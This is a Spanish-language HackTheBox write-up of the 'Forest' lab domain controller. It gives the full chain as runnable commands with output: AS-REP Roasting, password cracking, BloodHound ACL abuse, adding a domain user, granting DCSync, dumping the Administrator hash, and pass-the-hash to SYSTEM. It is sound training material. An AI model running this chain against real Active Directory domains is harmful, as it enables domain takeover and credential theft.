---
icon: windows
tags:
  - active-directory
  - smb
  - kerberos
---

# Forest

## Resumen

### Detalles

| Campo                 | Detalle       |
| --------------------- | ------------- |
| **Nombre**            | Forest        |
| **Sistema Operativo** | Windows       |
| **Plataforma**        | HackTheBox    |
| **Fecha**             | 28/10/2026    |
| **IP Objetivo**       | 10.129.91.164 |

### Executive Summary

La máquina **Forest** expone un Controlador de Dominio (DC) de Active Directory (`htb.local`). La intrusión inicial se logró mediante un ataque de **AS-REP Roasting** contra la cuenta de servicio `svc-alfresco`, cuya contraseña fue crackeada exitosamente. Tras obtener acceso al sistema a través de **Evil-WinRM**, se realizó un análisis con **BloodHound** que reveló una cadena de permisos delegados excesivos. Aprovechando un permiso `GenericAll` sobre el grupo _Exchange Windows Permissions_ (que a su vez tiene `WriteDacl` sobre el dominio), se creó un usuario malicioso y se escalaron privilegios para obtener el permiso de **DCSync**. Finalmente, se extrajeron los hashes del dominio para realizar un ataque de **Pass-the-Hash** y comprometer el sistema como `NT AUTHORITY\SYSTEM`.

### Técnicas

* AS-REP Roasting
* Password Cracking
* Enumeración de Active Directory (BloodHound)
* ACL Abuse (DACL Modification)
* DCSync
* Pass-the-Hash (PtH)

## Information Gathering

### Port Scanning

#### TCP

```bash
nmap -Pn -n -vv -p- 10.129.91.164 -oG allPorts
nmap -Pn -n -sCV -vv -p53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49667,49671,49676,49677,49683,49698 -oG allServices 10.129.91.164
```

| Puerto    | Servicio     | Versión                                                                                    | Notas             |
| --------- | ------------ | ------------------------------------------------------------------------------------------ | ----------------- |
| 53/tcp    | domain       | Simple DNS Plus                                                                            |                   |
| 88/tcp    | kerberos-sec | Microsoft Windows Kerberos (server time: 2026-10-28 10:00:46Z)                             |                   |
| 135/tcp   | msrpc        | Microsoft Windows RPC                                                                      |                   |
| 139/tcp   | netbios-ssn  | Microsoft Windows netbios-ssn                                                              |                   |
| 389/tcp   | ldap         | Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name) | Domain: htb.local |
| 445/tcp   | microsoft-ds | Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)                           |                   |
| 464/tcp   | kpasswd5?    |                                                                                            |                   |
| 593/tcp   | ncacn\_http  | Microsoft Windows RPC over HTTP 1.0                                                        |                   |
| 636/tcp   | tcpwrapped   |                                                                                            |                   |
| 3268/tcp  | ldap         | Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name) |                   |
| 3269/tcp  | tcpwrapped   |                                                                                            |                   |
| 5985/tcp  | http         | Microsoft HTTPAPI httpd 2.0 (SSDP\|UPnP)                                                   | WinRM             |
| 9389/tcp  | mc-nmf       | .NET Message Framing                                                                       |                   |
| 47001/tcp | http         | Microsoft HTTPAPI httpd 2.0 (SSDP\|UPnP)                                                   |                   |
| 49664/tcp | msrpc        | Microsoft Windows RPC                                                                      | Rango dinámico    |
| 49665/tcp | msrpc        | Microsoft Windows RPC                                                                      |                   |
| 49666/tcp | msrpc        | Microsoft Windows RPC                                                                      |                   |
| 49667/tcp | msrpc        | Microsoft Windows RPC                                                                      |                   |
| 49671/tcp | msrpc        | Microsoft Windows RPC                                                                      |                   |
| 49676/tcp | ncacn\_http  | Microsoft Windows RPC over HTTP 1.0                                                        |                   |
| 49677/tcp | msrpc        | Microsoft Windows RPC                                                                      |                   |
| 49683/tcp | msrpc        | Microsoft Windows RPC                                                                      |                   |
| 49698/tcp | msrpc        | Microsoft Windows RPC                                                                      |                   |

### Enumeration

#### SMB / RPC

Se comprueba la política de contraseñas y se enumera el dominio mediante una sesión nula (Null Auth), obteniendo un listado de usuarios válidos del sistema.

```bash
> nxc smb 10.129.91.164 --pass-pol -u "" -p ""
> rpcclient -U "" -p "" -N 10.129.91.164
rpcclient $> enumdomusers
```

```
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[DefaultAccount] rid:[0x1f7]
user:[$331000-VK4ADACQNUCA] rid:[0x463]
user:[SM_2c8eef0a09b545acb] rid:[0x464]
user:[SM_ca8c2ed5bdab4dc9b] rid:[0x465]
user:[SM_75a538d3025e4db9a] rid:[0x466]
user:[SM_681f53d4942840e18] rid:[0x467]
user:[SM_1b41c9286325456bb] rid:[0x468]
user:[SM_9b69f1b9d2cc45549] rid:[0x469]
user:[SM_7c96b981967141ebb] rid:[0x46a]
user:[SM_c75ee099d0a64c91b] rid:[0x46b]
user:[SM_1ffab36a2f5f479cb] rid:[0x46c]
user:[HealthMailboxc3d7722] rid:[0x46e]
user:[HealthMailboxfc9daad] rid:[0x46f]
user:[HealthMailboxc0a90c9] rid:[0x470]
user:[HealthMailbox670628e] rid:[0x471]
user:[HealthMailbox968e74d] rid:[0x472]
user:[HealthMailbox6ded678] rid:[0x473]
user:[HealthMailbox83d6781] rid:[0x474]
user:[HealthMailboxfd87238] rid:[0x475]
user:[HealthMailboxb01ac64] rid:[0x476]
user:[HealthMailbox7108a4e] rid:[0x477]
user:[HealthMailbox0659cc1] rid:[0x478]
user:[sebastien] rid:[0x479]
user:[lucinda] rid:[0x47a]
user:[svc-alfresco] rid:[0x47b]
user:[andy] rid:[0x47e]
user:[mark] rid:[0x47f]
user:[santi] rid:[0x480]
```

**Usuarios enumerados**:

* Administrator
* sebastien
* lucinda
* svc-alfresco
* andy
* mark
* santi

#### Kerberos

Se realiza una consulta para identificar cuentas que no requieren preautenticación Kerberos (vulnerables a AS-REP Roasting).

```bash
impacket-GetNPUsers -dc-ip 10.129.91.164 -request "htb.local/" -format hashcat
```

```
svc-alfresco  CN=Service Accounts,OU=Security Groups,DC=htb,DC=local  2026-10-28 11:22:13.708023  2019-09-23 13:09:47.931194  0x410200

$krb5asrep$23$svc-alfresco@HTB.LOCAL:ce47b9a1ad9f73e5d217e9ea48fe9ff9$d4bea2b615ab7e58d2dc3da471a1ebb873d8f77bc424a3c1f7edd1183dab9dc8525570956e52aa0c9ce34f9fb6ef2c9c2a1f9853f82c26129396c537e409564ca181dfcab0372ff0d2cf15c2990c54862aa4ad6731c617cb67ecb6ca759f973120ade1983863f6d5f1f46f3add5d2e899e9107fd04a4754c0132799bbc824b5569bf7490d3ce212ce1859e229ae50e4f8ce7ce5a0464ec08e768ccc378d02e413be561b836cbc108871c5ae05d6805bae640a27d83e6604bb479af474f009802031af9d4a02d09b6decd26106d44fe3e899a7d1ee9cca9e7f5914dcaf6db0ba431e181f639a5
```

**Resultado:** Se identifica al usuario `svc-alfresco` como vulnerable y se extrae su hash AS-REP.

## Explotación

### Foothold

* **Vulnerabilidad:** AS-REP Roasting (Cuenta sin preautenticación Kerberos).
* **Exploit:** `impacket-GetNPUsers` + `John the Ripper`
* **Procedimiento:**

1. **Se crackea el hash obtenido con el diccionario `rockyou.txt`**.

```bash
> john --wordlist=/usr/share/wordlists/rockyou.txt hashkrb5_alfresco.txt
```

```
   s3rvice          ($krb5asrep$23$svc-alfresco@HTB.LOCAL)
```

_Credenciales obtenidas:_ `svc-alfresco:s3rvice`

2. **Se establece conexión remota al servidor a través de WinRM**

```bash
   > evil-winrm -i 10.129.91.164 -u 'svc-alfresco' -p 's3rvice'
```

*   **Evidencia:** (`user.txt`)<br>

    <figure><img src="../../../.gitbook/assets/image (86).png" alt=""><figcaption></figcaption></figure>

### Privesc

* **Vulnerabilidad:** ACL Abuse (Permisos `GenericAll` y `WriteDacl` delegados incorrectamente)
* **Procedimiento:**

1. **Enumeración y Análisis:** Se vuelca la información de AD con `nxc` (NetExec) y se importa en **BloodHound**. Se descubre que `svc-alfresco` es miembro de `Account Operators`, lo que le otorga permiso `GenericAll` sobre el grupo `Exchange Windows Permissions`. Este último grupo tiene permiso `WriteDacl` sobre el dominio `htb.local`.

```bash
> nxc ldap 10.129.91.214 -u 'svc-alfresco' -p 's3rvice' -d htb.local --bloodhound --dns-server 10.129.91.214
```

<figure><img src="../../../.gitbook/assets/image (83).png" alt="" width="375"><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (84).png" alt="" width="324"><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (85).png" alt=""><figcaption></figcaption></figure>

2. **Creación de usuario:** Se crea un usuario bajo nuestro control y se une a dicho grupo para heredar sus privilegios.

```powershell
   # Victim Machine
   > net user intruso intruso /add /domain
   > net group "Exchange Windows Permissions" intruso /add /domain
```

3. **DCSync:** Utilizando el permiso de modificación de DACL heredado, se otorga al nuevo usuario el privilegio de replicación de directorio (DCSync).

```bash
   > bloodyAD -u intruso -p intruso -d HTB.LOCAL --host 10.129.91.214 add dcsync intruso
```

4. **Volcado de credenciales:** Se extraen los hashes del dominio (en este caso, del usuario Administrator).

```bash
> impacket-secretsdump 'HTB.LOCAL/intruso:intruso@10.129.91.214' -just-dc-user Administrator
```

5. **Pass-the-Hash:** Finalmente, se utiliza el hash extraído para autenticarse como Administrator y obtener una shell como `NT AUTHORITY\SYSTEM`.

```bash
impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6 HTB.LOCAL/Administrator@10.129.91.214
```

<figure><img src="../../../.gitbook/assets/image (81).png" alt=""><figcaption></figcaption></figure>

* **Evidencia:** (root.txt)&#x20;

<figure><img src="../../../.gitbook/assets/image (80).png" alt=""><figcaption></figcaption></figure>
